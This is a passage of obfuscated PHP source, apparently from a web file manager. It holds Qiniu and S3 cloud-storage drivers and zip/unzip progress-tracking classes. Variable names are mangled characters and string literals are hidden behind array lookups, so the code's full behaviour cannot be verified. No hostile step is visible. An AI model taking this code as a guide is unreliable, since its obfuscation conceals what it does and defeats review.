=== $Åú¿¦²[12]) { break; } } $this->cacheMethodInfoSet($Š¯Îìñ, !0); return array($Åú¿¦²[82] => $àÀ­„ò‹, $Åú¿¦²[83] => $ô´Ø‡Æú); } public function canRead($ÑÅñÚ) { return $this->exist($ÑÅñÚ) ? !0 : !1; } public function canWrite($Ãìı‚Œ¡) { return $this->exist($Ãìı‚Œ¡) ? !0 : !1; } public function getContent($çæ—†Æí) { return $this->fileSubstr($çæ—†Æí, 0, -1); } public function setContent($™İáˆ, $É¶ó¸ = '') { $¼óî®–® = $this->tempFile($this->pathThis($™İáˆ)); file_put_contents($¼óî®–®, $É¶ó¸); if ($this->upload($™İáˆ, $¼óî®–®)) { $this->tempFileRemve($¼óî®–®); return !0; } return !1; } public function refreshUrls($øìÊ„˜ê) { $ò™Šû‡â =& $_SERVER[ñˆ‹ß¿÷]; $¨êı¯»· = array(); if (is_array($øìÊ„˜ê)) { foreach ($øìÊ„˜ê as $Ù¦Å­µ·) { $¨êı¯»·[] = $this->link($Ù¦Å­µ·); } } else { $¨êı¯»·[] = $this->link($øìÊ„˜ê); } $Ç®øí£ = new Qiniu\Cdn\CdnManager($this->auth); list($ôé¡ÈéÂ, $‰óá©×¬) = $Ç®øí£->refreshUrls($¨êı¯»·); if ($‰óá©×¬) { return !1; } return $ôé¡ÈéÂ[$ò™Šû‡â[1190]] == $ò™Šû‡â[767] ? !0 : !1; } public function fileSubstr($ßä…èŞ›, $û•´ùÆí, $‚ú…é¿“) { $ìğÀˆÔÀ =& $_SERVER[ñˆ‹ß¿÷]; if (!($—ò«‚ñÑ = $this->link($ßä…èŞ›))) { return !1; } $À ¤äší = !1; if ($‚ú…é¿“ > 0) { $‘¯³ûÏ = $û•´ùÆí + $‚ú…é¿“ - 1; $À ¤äší = array($ìğÀˆÔÀ[1441] . $û•´ùÆí . $ìğÀˆÔÀ[386] . $‘¯³ûÏ); } $—Ÿ€•¢­ = url_request($—ò«‚ñÑ, $ìğÀˆÔÀ[230], !1, $À ¤äší); return $—Ÿ€•¢­[$ìğÀˆÔÀ[757]] ? $—Ÿ€•¢­[$ìğÀˆÔÀ[1200]] : !1; } public function upload($®­Œùƒæ, $ÌÀÌàâà, $™µÔ‰º¹ = false, $¿æ ïƒÚ = REPEAT_REPLACE) { $Â¸Õ†ß = new Qiniu\Storage\UploadManager(); $ã ·…ˆê = $this->auth->uploadToken($this->bucket, $®­Œùƒæ); $ÇóÒİÃ = get_file_mime(get_path_ext($ÌÀÌàâà)); list($ñ‚¤ªßä, $õõßºÈ’) = $Â¸Õ†ß->putFile($ã ·…ˆê, $®­Œùƒæ, $ÌÀÌàâà, null, $ÇóÒİÃ); return $õõßºÈ’ ? !1 : $this->getPathOuter($®­Œùƒæ); } public function uploadFormData($¯Ì¹²Ú, $ô–ø‰®« = 3600) { return $this->uploadToken($¯Ì¹²Ú, $ô–ø‰®«); } public function multiUploadFormData($…»ù¢ã, $§£óçë = 3600) { return $this->uploadToken($…»ù¢ã, $§£óçë); } private function uploadToken($´ù«ÔÜ, $ùÀ­ş”Œ = 3600) { $–”Š®Áœ =& $_SERVER[ñˆ‹ß¿÷]; $¼îˆ¥¤ğ = $ùÀ­ş”Œ; $Ò†ÊÌ± = array($–”Š®Áœ[1442] => $–”Š®Áœ[1443]); $»íèÄÁ = $´ù«ÔÜ; $Ğ×¼Ÿ¶ = $this->auth->uploadToken($this->bucket, $»íèÄÁ, $¼îˆ¥¤ğ, $Ò†ÊÌ±, !0); $ÆŞ“› = empty($this->region) || $this->region == $–”Š®Áœ[1444] ? $–”Š®Áœ[12] : $–”Š®Áœ[386] . $this->region; $«á¯àı¿ = http_type() . "\x3a\57\57\x75\x70\154\x6f\x61\x64{$ÆŞ“›}\56\x71\x69\x6e\x69\x75\x70\x2e\x63\x6f\x6d\x2f"; return array($–”Š®Áœ[1445] => $Ğ×¼Ÿ¶, $–”Š®Áœ[1446] => $«á¯àı¿); } public function download($âäœŠÏš, $İ¡Á) { $¨À‹™çç = IO::getPathInner(IO::mkfile($İ¡Á)); if (!($×¥º €¬ = $this->link($âäœŠÏš))) { return !1; } $¬²ŠÄ‘¶ = 0; $ç·‘… = 1024 * 200; $­‡¨ºÆ„ = fopen($¨À‹™çç, $_SERVER[ñˆ‹ß¿÷][1447]); while (!0) { $½ÊßÁÇ— = $this->fileSubstr($âäœŠÏš, $¬²ŠÄ‘¶, $ç·‘…); if ($½ÊßÁÇ— === !1) { return !1; } fwrite($­‡¨ºÆ„, $½ÊßÁÇ—); $¬²ŠÄ‘¶ += $ç·‘…; if (strlen($½ÊßÁÇ—) < $ç·‘…) { break; } } fclose($­‡¨ºÆ„); return $İ¡Á; } public function link($öÌé‚ı, $ ÔÜÊ°à = '') { if (!$this->isFile($öÌé‚ı)) { return !1; } $ì™äÇ¨ô = $this->getHost() . $_SERVER[ñˆ‹ß¿÷][8] . $this->pathEncode($öÌé‚ı) . $ ÔÜÊ°à; return $this->auth->privateDownloadUrl($ì™äÇ¨ô, 3600 * 12); } public function fileOut($Úñ±ğ›, $µ¾Œ„ıœ = false, $ªÀÌåï¡ = false, $òãıø‡Ñ = '') { $™§›˜Ú =& $_SERVER[ñˆ‹ß¿÷]; if ($this->isFileOutServer()) { return $this->fileOutServer($Úñ±ğ›, $µ¾Œ„ıœ, $ªÀÌåï¡, $òãıø‡Ñ); } if (!$ªÀÌåï¡) { $ªÀÌåï¡ = $this->pathThis($Úñ±ğ›); } $õ¹„ÆÌô = $µ¾Œ„ıœ ? $™§›˜Ú[1448] . rawurlencode($ªÀÌåï¡) : $™§›˜Ú[12]; $È¢ú»¯‘ = $this->link($Úñ±ğ›, $õ¹„ÆÌô); $this->fileOutLink($È¢ú»¯‘); } public function fileOutServer($êßœóÒğ, $à™åã°° = false, $×ÓøƒˆÃ = false, $¸Ûœ›èÁ = '') { parent::fileOut($êßœóÒğ, $à™åã°°, $×ÓøƒˆÃ, $¸Ûœ›èÁ); } public function fileOutImage($Ššõ€«ü, $„ßûíÉ = 250) { $ø’¤¢é = $this->link($Ššõ€«ü, $_SERVER[ñˆ‹ß¿÷][1449] . $„ßûíÉ); $this->fileOutLink($ø’¤¢é); } public function fileOutImageServer($÷¹»£, $ıêş×ÙÕ = 250) { parent::fileOutImage($÷¹»£, $ıêş×ÙÕ); } public function hashMd5($·÷…ëÃø) { $ÆŞ´³¼² =& $_SERVER[ñˆ‹ß¿÷]; $Çûãøõ° = $this->objectMeta($·÷…ëÃø); return isset($Çûãøõ°[$ÆŞ´³¼²[212]]) ? $Çûãøõ°[$ÆŞ´³¼²[212]] : !1; $ë‘–ØÎ¶ = $this->link($·÷…ëÃø, $ÆŞ´³¼²[1450]); } public function size($êª¥õõ§) { $şî¾÷š• = $this->objectMeta($êª¥õõ§); return $şî¾÷š• ? $şî¾÷š•[$_SERVER[ñˆ‹ß¿÷][76]] : 0; } public function info($Œª»®â) { if ($this->isFolder($Œª»®â)) { return $this->folderInfo($Œª»®â); } else { if ($this->isFile($Œª»®â)) { return $this->fileInfo($Œª»®â); } } return !1; } public function exist($Ñùú©ßÆ) { return $this->isFile($Ñùú©ßÆ) || $this->isFolder($Ñùú©ßÆ); } public function isFile($•è£Ú‘ö) { return !$this->isFolder($•è£Ú‘ö) && $this->objectMeta($•è£Ú‘ö); } public function isFolder($“£…ß£š) { return $this->cacheMethod($_SERVER[ñˆ‹ß¿÷][165], $“£…ß£š); } protected function objectMeta($é‡°ªñœ) { return $this->cacheMethod($_SERVER[ñˆ‹ß¿÷][167], $é‡°ªñœ); } protected function _objectMeta($§§ËÙŠĞ) { $Ã¦ù¹åÀ =& $_SERVER[ñˆ‹ß¿÷]; list($®·Ïò¼ó, $ıêÛˆÊ) = $this->bucketManager->stat($this->bucket, $§§ËÙŠĞ); if ($®·Ïò¼ó) { $®·Ïò¼ó[$Ã¦ù¹åÀ[76]] = intval($®·Ïò¼ó[$Ã¦ù¹åÀ[1436]]); } return $®·Ïò¼ó; } protected function _isFolder($âŞ–‡‘„) { $î´çšñ =& $_SERVER[ñˆ‹ß¿÷]; if ($âŞ–‡‘„ == $î´çšñ[12] || $âŞ–‡‘„ == $î´çšñ[8]) { return !0; } list($ÎÏ²É«•, $óÛ‘ì¯Ì) = $this->bucketManager->listFiles($this->bucket, trim($âŞ–‡‘„, $î´çšñ[8]) . $î´çšñ[8], $î´çšñ[12], 1, $î´çšñ[8]); return !empty($ÎÏ²É«•[$î´çšñ[1439]]) || !empty($ÎÏ²É«•[$î´çšñ[1440]]) ? !0 : !1; } } class PathDriverS3 extends PathDriverBaseS3 { public function __construct($Ëù†ËäÄ) { parent::__construct($Ëù†ËäÄ); } public function uploadFormData($ë«à˜Ç€, $üÒ£ù£Ç = 3600) { $Ò»”íˆ© =& $_SERVER[ñˆ‹ß¿÷]; $­†”õÑ‹ = $Ò»”íˆ©[198]; $µ¶•å– = $Ò»”íˆ©[1355]; $ÖÃæ±‹Â = $Ò»”íˆ©[62]; $×øª‡šù = gmdate($Ò»”íˆ©[1356]); $ÊéÈ…Ğ¨ = gmdate($Ò»”íˆ©[758]); $¬î¹êû× = $Ò»”íˆ©[1357]; $È„òæº› = $üÒ£ù£Ç . $Ò»”íˆ©[12]; $°£æ„üÓ = $Ò»”íˆ©[1317]; $ò’›˜¸ë = array($this->accessKey, $ÊéÈ…Ğ¨, $this->region, $ÖÃæ±‹Â, $¬î¹êû×); $í‚Ş×İ = implode($Ò»”íˆ©[8], $ò’›˜¸ë); $·¢°Êº = array($Ò»”íˆ©[1319] => gmdate($Ò»”íˆ©[1318], strtotime($Ò»”íˆ©[1358])), $Ò»”íˆ©[1320] => array(array($Ò»”íˆ©[1322] => $this->bucket), array($Ò»”íˆ©[1321] => $­†”õÑ‹), array($Ò»”íˆ©[1323], $Ò»”íˆ©[1324], $Ò»”íˆ©[12]), array($Ò»”íˆ©[1323], $Ò»”íˆ©[1359], $Ò»”íˆ©[12]), array($Ò»”íˆ©[1323], $Ò»”íˆ©[1360], $Ò»”íˆ©[12]), array($Ò»”íˆ©[1325] => $°£æ„üÓ), array($Ò»”íˆ©[1361] => $í‚Ş×İ), array($Ò»”íˆ©[1362] => $µ¶•å–), array($Ò»”íˆ©[1363] => $×øª‡šù), array($Ò»”íˆ©[1364] => $È„òæº›))); $‡öôÖ“Ï = base64_encode(json_encode($·¢°Êº)); $¯Œ¬ßŠ = hash_hmac($Ò»”íˆ©[1365], $ÊéÈ…Ğ¨, $Ò»”íˆ©[1366] . $this->secret, !0); $¶ë¬ĞÒä = hash_hmac($Ò»”íˆ©[1365], $this->region, $¯Œ¬ßŠ, !0); $¶‰×ğ¯· = hash_hmac($Ò»”íˆ©[1365], $ÖÃæ±‹Â, $¶ë¬ĞÒä, !0); $˜¦£º¦Ú = hash_hmac($Ò»”íˆ©[1365], $¬î¹êû×, $¶‰×ğ¯·, !0); $ÌÊÈÂğ¶ = hash_hmac($Ò»”íˆ©[1365], $‡öôÖ“Ï, $˜¦£º¦Ú); $à…—ş„Æ = array($Ò»”íˆ©[215] => $Ò»”íˆ©[12], $Ò»”íˆ©[1367] => $Ò»”íˆ©[12], $Ò»”íˆ©[1321] => $­†”õÑ‹, $Ò»”íˆ©[1325] => $°£æ„üÓ, $Ò»”íˆ©[1329] => $‡öôÖ“Ï, $Ò»”íˆ©[1368] => $í‚Ş×İ, $Ò»”íˆ©[1369] => $µ¶•å–, $Ò»”íˆ©[1370] => $×øª‡šù, $Ò»”íˆ©[1371] => $È„òæº›, $Ò»”íˆ©[1372] => $ÌÊÈÂğ¶, $Ò»”íˆ©[181] => $this->getHost()); return $à…—ş„Æ; } public function multiUploadFormData($ÃºÆÍ½, $ñ¿ü¤ş© = 3600) { $Éõı£ıê =& $_SERVER[ñˆ‹ß¿÷]; $—İì£¢ = gmdate($Éõı£ıê[1451]); $ïæÂ‚§ = array(); $À«ˆ¯¬ì = $this->client->getUploadId($this->bucket, $ÃºÆÍ½, $ïæÂ‚§); if (!$À«ˆ¯¬ì) { return !1; } return array($Éõı£ıê[223] => $À«ˆ¯¬ì, $Éõı£ıê[181] => $this->getHost() . $Éõı£ıê[8] . $this->pathEncode($ÃºÆÍ½), $Éõı£ıê[224] => $—İì£¢, $Éõı£ıê[94] => $ÃºÆÍ½); } public function multiUploadAuthData($ôÆèâ…ƒ, $†ëÓ¦ºà = array()) { $ËĞë¶¯‘ =& $_SERVER[ñˆ‹ß¿÷]; $î›¯™Éµ = isset($†ëÓ¦ºà[$ËĞë¶¯‘[174]]) ? $†ëÓ¦ºà[$ËĞë¶¯‘[174]] : $ËĞë¶¯‘[12]; $±Ø°îÓò = $†ëÓ¦ºà[$ËĞë¶¯‘[94]]; unset($†ëÓ¦ºà[$ËĞë¶¯‘[94]]); if (isset($†ëÓ¦ºà[$ËĞë¶¯‘[225]])) { return $this->listUploadParts($±Ø°îÓò, $†ëÓ¦ºà); } $ÀƒÛÉ“ = array(); if (isset($†ëÓ¦ºà[$ËĞë¶¯‘[1452]])) { $ÀƒÛÉ“[$ËĞë¶¯‘[1453]] = $†ëÓ¦ºà[$ËĞë¶¯‘[1452]]; } $‡¸ñ˜× = explode($ËĞë¶¯‘[183], $this->getHost()); $Â¸ùÜˆÜ = array($ËĞë¶¯‘[1454] => $‡¸ñ˜×[1], $ËĞë¶¯‘[1455] => $ËĞë¶¯‘[12], $ËĞë¶¯‘[215] => $ËĞë¶¯‘[120], $ËĞë¶¯‘[1367] => $†ëÓ¦ºà[$ËĞë¶¯‘[76]]); $ÉÖ¾Öœ£ = $ËĞë¶¯‘[228]; $éêíÙ”à = $ËĞë¶¯‘[8] . $this->pathEncode($±Ø°îÓò) . $î›¯™Éµ; $½ËíÎ¾™ = $this->client->__getSignatureV4($ÀƒÛÉ“, $Â¸ùÜˆÜ, $ÉÖ¾Öœ£, $éêíÙ”à); if (strpos($î›¯™Éµ, $ËĞë¶¯‘[227]) === 0) { if (isset($ÀƒÛÉ“[$ËĞë¶¯‘[1453]])) { $ı™¾­îİ = $ÀƒÛÉ“[$ËĞë¶¯‘[1453]]; } else { if (isset($½ËíÎ¾™[$ËĞë¶¯‘[1453]])) { $ı™¾­îİ = $½ËíÎ¾™[$ËĞë¶¯‘[1453]]; } else { $ı™¾­îİ = hash($ËĞë¶¯‘[1365], $ËĞë¶¯‘[12]); } } return array($ËĞë¶¯‘[234] => $½ËíÎ¾™[$ËĞë¶¯‘[234]], $ËĞë¶¯‘[1453] => $ı™¾­îİ, $ËĞë¶¯‘[224] => $½ËíÎ¾™[$ËĞë¶¯‘[1456]]); } return $½ËíÎ¾™[$ËĞë¶¯‘[234]]; } public function listUploadParts($ºÑÒÛ», $»À‘’Â = array()) { $ŸÈ¨§şø =& $_SERVER[ñˆ‹ß¿÷]; $ËˆŒ–Ï± = str_replace($ŸÈ¨§şø[235], $ŸÈ¨§şø[12], $»À‘’Â[$ŸÈ¨§şø[174]]); $ŠÇû¼‚¢ = $this->client->listParts($this->bucket, $ºÑÒÛ», $ËˆŒ–Ï±); if (!$ŠÇû¼‚¢) { return !1; } $Ì‡Áëæó = $ŸÈ¨§şø[1457]; foreach ($ŠÇû¼‚¢ as $¨—¥²€±) { $Ì‡Áëæó .= $ŸÈ¨§şø[1458] . "\x3c\120\x61\162\x74\x4e\165\155\x62\145\x72\76{$¨—¥²€±[$ŸÈ¨§şø[1412]]}\x3c\57\120\x61\162\164\x4e\165\155\x62\145\162\x3e\12" . "\x3c\105\124\141\147\76{$¨—¥²€±[$ŸÈ¨§şø[1413]]}\74\x2f\105\124\141\147\x3e\xa" . $ŸÈ¨§şø[1459]; } $Ì‡Áëæó .= $ŸÈ¨§şø[1460]; $âşê…¿æ = array(); $“âÚæ·Ú = explode($ŸÈ¨§şø[183], $this->getHost()); $ß²É‹“Ñ = array($ŸÈ¨§şø[1454] => $“âÚæ·Ú[1], $ŸÈ¨§şø[215] => $ŸÈ¨§şø[120], $ŸÈ¨§şø[1367] => strlen($Ì‡Áëæó)); $¿”®±ÉÔ = $ŸÈ¨§şø[226]; $ßı¼Ú¿î = $ŸÈ¨§şø[8] . $this->pathEncode($ºÑÒÛ») . $»À‘’Â[$ŸÈ¨§şø[174]]; $ÈÆÁÑè = $this->client->__getSignatureV4($âşê…¿æ, $ß²É‹“Ñ, $¿”®±ÉÔ, $ßı¼Ú¿î, $Ì‡Áëæó); return array($ŸÈ¨§şø[234] => $ÈÆÁÑè[$ŸÈ¨§şø[234]], $ŸÈ¨§şø[224] => $ÈÆÁÑè[$ŸÈ¨§şø[1456]], $ŸÈ¨§şø[236] => $ŠÇû¼‚¢, $ŸÈ¨§şø[1453] => $ÈÆÁÑè[$ŸÈ¨§şø[1453]]); } public function link($öè¸×÷¨, $ÙñÌÈ‡Á = array()) { return parent::link($öè¸×÷¨, $ÙñÌÈ‡Á); } public function fileOut($ø©§ŠØà, $¿ÊÆÂÊ = false, $ÀËÔÏ¿Ä = false, $Å¡çŠß  = '') { if ($this->isFileOutServer() || strstr($this->endpoint, $_SERVER[ñˆ‹ß¿÷][1461])) { return parent::fileOutServer($ø©§ŠØà, $¿ÊÆÂÊ, $ÀËÔÏ¿Ä, $Å¡çŠß ); } parent::fileOut($ø©§ŠØà, $¿ÊÆÂÊ, $ÀËÔÏ¿Ä, $Å¡çŠß ); } public function fileOutImage($Ğ§¸ç½Ù, $¬–íÛ¾Š = 250) { if (strstr($this->endpoint, $_SERVER[ñˆ‹ß¿÷][1461])) { return parent::fileOutImageServer($Ğ§¸ç½Ù, $¬–íÛ¾Š); } parent::fileOutImage($Ğ§¸ç½Ù, $¬–íÛ¾Š); } public function fileOutLink($œ©¶¡Í) { $‰Æ«Å¼ =& $_SERVER[ñˆ‹ß¿÷]; if (substr($œ©¶¡Í, 0, 7) == $‰Æ«Å¼[1332]) { $œ©¶¡Í = $‰Æ«Å¼[1333] . substr($œ©¶¡Í, 7); } header($‰Æ«Å¼[161] . $œ©¶¡Í); die; } public function getHost() { $•€ÓŠÊÖ =& $_SERVER[ñˆ‹ß¿÷]; $€ò²¹Œ¸ = str_rtrim(parent::getHost(), $•€ÓŠÊÖ[8] . $this->bucket); $€ò²¹Œ¸ = explode($•€ÓŠÊÖ[183], $€ò²¹Œ¸); return $€ò²¹Œ¸[0] . $•€ÓŠÊÖ[183] . $this->bucket . $•€ÓŠÊÖ[10] . $€ò²¹Œ¸[1]; } } goto F·¿ÊÙâ‚é; fŞ††¾†—æ: class TaskUnzip extends TaskFileTransfer { protected function startAfter() { $î§ôõ‹ =& $_SERVER[ñˆ‹ß¿÷]; parent::startAfter(); Hook::bind($î§ôõ‹[1757], array($this, $î§ôõ‹[1758])); Hook::bind($î§ôõ‹[1201], array($this, $î§ôõ‹[1759])); $Å±¹¶±™ =& $this->task; $Å±¹¶±™[$î§ôõ‹[1760]] = $î§ôõ‹[1206]; if (!$Å±¹¶±™[$î§ôõ‹[1563]]) { $Å±¹¶±™[$î§ôõ‹[1563]] = LNG($î§ôõ‹[1761]); } } protected function endAfter() { $ô¹¬ÂıÆ =& $_SERVER[ñˆ‹ß¿÷]; parent::endAfter(); Hook::unbind($ô¹¬ÂıÆ[1757], array($this, $ô¹¬ÂıÆ[1758])); Hook::unbind($ô¹¬ÂıÆ[1201], array($this, $ô¹¬ÂıÆ[1759])); } public function updateAfter() { $‹Àœèéº =& $_SERVER[ñˆ‹ß¿÷]; $—‘Çùº› =& $this->task; if (!$—‘Çùº›[$‹Àœèéº[793]] || !$—‘Çùº›[$‹Àœèéº[770]]) { return; } if ($—‘Çùº›[$‹Àœèéº[1760]] == $‹Àœèéº[1206]) { $çÍö¿õ÷ = 0; if ($—‘Çùº›[$‹Àœèéº[1715]]) { $çÍö¿õ÷ = $—‘Çùº›[$‹Àœèéº[1716]] / $—‘Çùº›[$‹Àœèéº[1715]]; } $—‘Çùº›[$‹Àœèéº[1666]] = $çÍö¿õ÷ * 0.3; } else { if ($—‘Çùº›[$‹Àœèéº[1760]] == $‹Àœèéº[313]) { $çÍö¿õ÷ = $—‘Çùº›[$‹Àœèéº[1665]] / $—‘Çùº›[$‹Àœèéº[793]]; $—‘Çùº›[$‹Àœèéº[1666]] = 0.3 + $çÍö¿õ÷ * 0.4; } else { if ($—‘Çùº›[$‹Àœèéº[1760]] == $‹Àœèéº[107]) { $ÙŒÇÚåĞ = 0; if ($—‘Çùº›[$‹Àœèéº[1717]] == $‹Àœèéº[107]) { $ÙŒÇÚåĞ = $—‘Çùº›[$‹Àœèéº[1716]]; } $çÍö¿õ÷ = ($—‘Çùº›[$‹Àœèéº[1720]] + $ÙŒÇÚåĞ) / $—‘Çùº›[$‹Àœèéº[770]]; $—‘Çùº›[$‹Àœèéº[1666]] = 0.3 + 0.4 + $çÍö¿õ÷ * 0.3; } } } if ($—‘Çùº›[$‹Àœèéº[1666]] > 0) { $¸øœú² = timeFloat() - $—‘Çùº›[$‹Àœèéº[1668]] - $—‘Çùº›[$‹Àœèéº[1671]]; $—‘Çùº›[$‹Àœèéº[1672]] = $¸øœú² * (1 - $—‘Çùº›[$‹Àœèéº[1666]]) / $—‘Çùº›[$‹Àœèéº[1666]]; } } public function addFile($²”î™ÁŸ) { $„Ü°ÔÇê =& $_SERVER[ñˆ‹ß¿÷]; $±ÎîÕÑÙ =& $this->task; $ÌËüÍï = IO::info($²”î™ÁŸ); $±ÎîÕÑÙ[$„Ü°ÔÇê[1713]] = $ÌËüÍï[$„Ü°ÔÇê[32]]; $±ÎîÕÑÙ[$„Ü°ÔÇê[1715]] = $ÌËüÍï[$„Ü°ÔÇê[76]]; $±ÎîÕÑÙ[$„Ü°ÔÇê[1716]] = 0; $±ÎîÕÑÙ[$„Ü°ÔÇê[1071]] = $„Ü°ÔÇê[1736]; $±ÎîÕÑÙ[$„Ü°ÔÇê[1717]] = $„Ü°ÔÇê[1206]; $±ÎîÕÑÙ[$„Ü°ÔÇê[770]] = $ÌËüÍï[$„Ü°ÔÇê[76]]; $±ÎîÕÑÙ[$„Ü°ÔÇê[793]] = 1; $ÒäÍŸ» = 0; $±ÎîÕÑÙ[$„Ü°ÔÇê[1724]] = array($„Ü°ÔÇê[1725] => $ÒäÍŸ» + 1, $„Ü°ÔÇê[420] => $ÌËüÍï[$„Ü°ÔÇê[32]], $„Ü°ÔÇê[84] => $ÌËüÍï[$„Ü°ÔÇê[84]], $„Ü°ÔÇê[519] => $ÌËüÍï[$„Ü°ÔÇê[519]] ? $ÌËüÍï[$„Ü°ÔÇê[519]] : $ÌËüÍï[$„Ü°ÔÇê[84]]); $this->update(); } public function unzipAfter($›±¡ô) { $° ³Ùé =& $_SERVER[ñˆ‹ß¿÷]; $ˆêÛâãÀ =& $this->task; $ˆêÛâãÀ[$° ³Ùé[1760]] = $° ³Ùé[107]; $ª¼©úÊÁ = IO::infoWithChildren($›±¡ô); $ûÃš = 0; $ˆêÛâãÀ[$° ³Ùé[1724]] = array($° ³Ùé[1725] => $ûÃš + 1, $° ³Ùé[420] => $ª¼©úÊÁ[$° ³Ùé[32]], $° ³Ùé[84] => $ª¼©úÊÁ[$° ³Ùé[84]], $° ³Ùé[519] => $ª¼©úÊÁ[$° ³Ùé[519]] ? $ª¼©úÊÁ[$° ³Ùé[519]] : $ª¼©úÊÁ[$° ³Ùé[84]]); if ($ª¼©úÊÁ[$° ³Ùé[33]] == $° ³Ùé[199]) { $ˆêÛâãÀ[$° ³Ùé[793]] = 1; } else { $ˆêÛâãÀ[$° ³Ùé[793]] = $ª¼©úÊÁ[$° ³Ùé[79]][$° ³Ùé[77]]; } $ˆêÛâãÀ[$° ³Ùé[1071]] = $° ³Ùé[12]; $ˆêÛâãÀ[$° ³Ùé[1717]] = 0; $ˆêÛâãÀ[$° ³Ùé[1665]] = 0; $ˆêÛâãÀ[$° ³Ùé[1715]] = 0; $ˆêÛâãÀ[$° ³Ùé[1716]] = 0; $ˆêÛâãÀ[$° ³Ùé[1713]] = $° ³Ùé[12]; $ˆêÛâãÀ[$° ³Ùé[1720]] = 0; $ˆêÛâãÀ[$° ³Ùé[770]] = $ª¼©úÊÁ[$° ³Ùé[76]]; $this->update(); self::log($° ³Ùé[1762] . json_encode(array($ˆêÛâãÀ, $ª¼©úÊÁ))); } public function nameParse($àÛï„ø‹) { $ôÊÛîè¢ =& $_SERVER[ñˆ‹ß¿÷]; $¦ ÒÔ =& $this->task; if ($¦ ÒÔ[$ôÊÛîè¢[1760]] == $ôÊÛîè¢[1206]) { $¦ ÒÔ[$ôÊÛîè¢[1760]] = $ôÊÛîè¢[313]; $¦ ÒÔ[$ôÊÛîè¢[1720]] = 0; $¦ ÒÔ[$ôÊÛîè¢[770]] = 0; } $ØìÙ¡ª = get_path_this($àÛï„ø‹); if (strstr($ØìÙ¡ª, $ôÊÛîè¢[10])) { $¦ ÒÔ[$ôÊÛîè¢[1665]] += 1; $¦ ÒÔ[$ôÊÛîè¢[793]] += 1; } $¦ ÒÔ[$ôÊÛîè¢[1713]] = $àÛï„ø‹; $this->update(); } } class TaskZip extends TaskFileTransfer { protected function startAfter() { $½×Íâ¬ =& $_SERVER[ñˆ‹ß¿÷]; parent::startAfter(); Hook::bind($½×Íâ¬[1763], array($this, $½×Íâ¬[1758])); $ÜÜ“¦€¦ =& $this->task; $ÜÜ“¦€¦[$½×Íâ¬[1760]] = $½×Íâ¬[1206]; if (!$ÜÜ“¦€¦[$½×Íâ¬[1563]]) { $ÜÜ“¦€¦[$½×Íâ¬[1563]] = LNG($½×Íâ¬[1764]); } } protected function endAfter() { $©ñøùç =& $_SERVER[ñˆ‹ß¿÷]; parent::endAfter(); Hook::unbind($©ñøùç[1763], array($this, $©ñøùç[1758])); } public function updateAfter() { $©®ì”µŸ =& $_SERVER[ñˆ‹ß¿÷]; $ô¯Äæ®‚ =& $this->task; if (!$ô¯Äæ®‚[$©®ì”µŸ[793]] || !$ô¯Äæ®‚[$©®ì”µŸ[770]]) { return; } if ($ô¯Äæ®‚[$©®ì”µŸ[1760]] == $©®ì”µŸ[1206]) { $ìÍúá§Á = $ô¯Äæ®‚[$©®ì”µŸ[1716]]; if ($ô¯Äæ®‚[$©®ì”µŸ[1717]] != $©®ì”µŸ[1206]) { $ìÍúá§Á = 0; } $ºº¦áä‘ = ($ô¯Äæ®‚[$©®ì”µŸ[1720]] + $ìÍúá§Á) / $ô¯Äæ®‚[$©®ì”µŸ[770]]; $ô¯Äæ®‚[$©®ì”µŸ[1666]] = $ºº¦áä‘ * 0.3; } else { if ($ô¯Äæ®‚[$©®ì”µŸ[1760]] == $©®ì”µŸ[313]) { $ºº¦áä‘ = $ô¯Äæ®‚[$©®ì”µŸ[1665]] / $ô¯Äæ®‚[$©®ì”µŸ[793]]; $ô¯Äæ®‚[$©®ì”µŸ[1666]] = 0.3 + $ºº¦áä‘ * 0.5; } else { if ($ô¯Äæ®‚[$©®ì”µŸ[1760]] == $©®ì”µŸ[107]) { $ºº¦áä‘ = 0; if ($ô¯Äæ®‚[$©®ì”µŸ[1715]]) { $ºº¦áä‘ = $ô¯Äæ®‚[$©®ì”µŸ[1716]] / $ô¯Äæ®‚[$©®ì”µŸ[1715]]; } $ô¯Äæ®‚[$©®ì”µŸ[1666]] = 0.3 + 0.5 + $ºº¦áä‘ * 0.2; } } } if ($ô¯Äæ®‚[$©®ì”µŸ[1666]] > 0) { $ÁÒ­ÑÖ• = timeFloat() - $ô¯Äæ®‚[$©®ì”µŸ[1668]] - $ô¯Äæ®‚[$©®ì”µŸ[1671]]; $ô¯Äæ®‚[$©®ì”µŸ[1672]] = $ÁÒ­ÑÖ• * (1 - $ô¯Äæ®‚[$©®ì”µŸ[1666]]) / $ô¯Äæ®‚[$©®ì”µŸ[1666]]; } } public function copyFileStart($ıÊè³°“, $¨šËÂ¦Ï, $š‰‡Ïï¶, $Ã‚ŞÖ‹ş, $²Æ¯’òË, $ÖË§‡½) { $¼•É£ñ§ =& $_SERVER[ñˆ‹ß¿÷]; parent::copyFileStart($ıÊè³°“, $¨šËÂ¦Ï, $š‰‡Ïï¶, $Ã‚ŞÖ‹ş, $²Æ¯’òË, $ÖË§‡½); $ú´Ù¶ëä =& $this->task; if ($ú´Ù¶ëä[$¼•É£ñ§[1760]] == $¼•É£ñ§[313]) { $ú´Ù¶ëä[$¼•É£ñ§[1760]] = $¼•É£ñ§[107]; } $this->update(); } public function copyFileEnd($æé¨Öò, $€Çüæ¸Ú, $š–ùĞ‚, $îáÌ•Àä, $ú‹İÚËŒ, $ÏöŠ¢á·) { $µİ­Õ×¡ =& $_SERVER[ñˆ‹ß¿÷]; $¢Ã«ÚŒ =& $this->task; $¢Ã«ÚŒ[$µİ­Õ×¡[1716]] = $¢Ã«ÚŒ[$µİ­Õ×¡[1715]]; $¢Ã«ÚŒ[$µİ­Õ×¡[1720]] += $¢Ã«ÚŒ[$µİ­Õ×¡[1715]]; $¢Ã«ÚŒ[$µİ­Õ×¡[1717]] = $µİ­Õ×¡[12]; $this->update(); } public function nameParse($‘èçè¢³) { $ˆ ”¹× =& $_SERVER[ñˆ‹ß¿÷]; $ÆıŠÖ³Ÿ =& $this->task; if ($ÆıŠÖ³Ÿ[$ˆ ”¹×[1665]] < $ÆıŠÖ³Ÿ[$ˆ ”¹×[793]]) { $±ıö¨íÑ = get_path_this($‘èçè¢³); if (strstr($±ıö¨íÑ, $ˆ ”¹×[10])) { $ÆıŠÖ³Ÿ[$ˆ ”¹×[1665]] += 1; } } if ($ÆıŠÖ³Ÿ[$ˆ ”¹×[1760]] == $ˆ ”¹×[1206]) { $ÆıŠÖ³Ÿ[$ˆ ”¹×[1760]] = $ˆ ”¹×[313]; } $ÆıŠÖ³Ÿ[$ˆ ”¹×[1713]] = $‘èçè¢³; $this->update(); } } class AnalysisModel extends 